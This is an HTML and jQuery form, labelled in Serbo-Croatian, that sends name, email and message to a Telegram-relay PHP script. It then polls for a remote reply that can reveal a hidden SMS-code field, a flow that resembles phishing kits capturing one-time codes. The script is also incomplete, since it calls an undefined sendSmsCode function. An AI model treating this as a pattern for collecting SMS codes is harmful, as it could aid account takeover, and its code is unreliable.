<!DOCTYPE html>
<html>
<head>
    <title>Forma za Telegram</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        #spinner {
            display: none;
        }
    </style>
</head>
<body>
    <form id="telegramForm">
        <label for="name">Ime:</label><br>
        <input type="text" id="name" name="name"><br>

        <label for="email">Email:</label><br>
        <input type="email" id="email" name="email"><br>

        <label for="message">Poruka:</label><br>
        <textarea id="message" name="message"></textarea><br>

        <button type="submit" id="submit-btn">Pošalji</button>
        <div id="spinner">Učitavanje...</div>
        
        <input type="text" id="smsCode" name="smsCode" placeholder="Unesite SMS kod" style="display: none;">
        <button type="button" id="sendSmsCode-btn" style="display: none;">Pošalji SMS kod</button>
    </form>

    <script>
        $(document).ready(function() {
            $('#telegramForm').submit(function(event) {
                event.preventDefault();
                sendToTelegram();
            });
        });

        function sendToTelegram() {
            $('#submit-btn').hide();
            $('#spinner').show();

            var formData = {
                'name': $('#name').val(),
                'email': $('#email').val(),
                'message': $('#message').val()
            };

            $.ajax({
                type: 'POST',
                url: 'sendToTelegram.php',
                data: formData,
                dataType: 'json',
                encode: true
            })
            .done(function(data) {
                console.log(data);
                if(data.status === 'success') {
                    checkResponseStatus(data.uniqueId);
                }
            })
            .fail(function(data) {
                console.error(data); 
                $('#spinner').hide();
                $('#submit-btn').show();
            });
        }

        function checkResponseStatus(uniqueId) {
            var interval = setInterval(function() {
                $.ajax({
                    type: 'GET',
                    url: 'checkResponseStatus.php',
                    data: {'uniqueId': uniqueId},
                    dataType: 'json',
                    success: function(response) {
                        if(response.status === 'received') {
                            clearInterval(interval);
                            $('#spinner').hide();
                            if(response.response === 'sms') {
                                // Prikazivanje polja za SMS kod i dugmeta za slanje
                                $('#smsCode').show();
                                $('#sendSmsCode-btn').show();
                                $('#submit-btn').hide();
                            
                                // Dodavanje event listener-a za novo dugme
                                $('#sendSmsCode-btn').click(function() {
                                    sendSmsCode(uniqueId);
                                });
                            } else {
                                $('#submit-btn').show();
                            }
                        }
                    }
                });
            }, 2000);
        }
    </script>
</body>
</html>
